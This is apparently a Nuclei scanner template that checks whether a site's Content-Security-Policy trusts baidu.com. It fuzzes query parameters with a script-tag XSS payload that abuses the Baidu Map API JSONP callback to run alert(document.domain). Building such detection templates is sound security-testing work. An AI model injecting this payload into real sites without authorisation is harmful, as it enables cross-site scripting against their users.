flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - baidu_map_api_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: baidu_map_api_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - baidu.com
  method: GET
  path:
  - '{{BaseURL}}'
id: baidu-map-api-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Baidu Map API
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,baidu-map-api,vuln
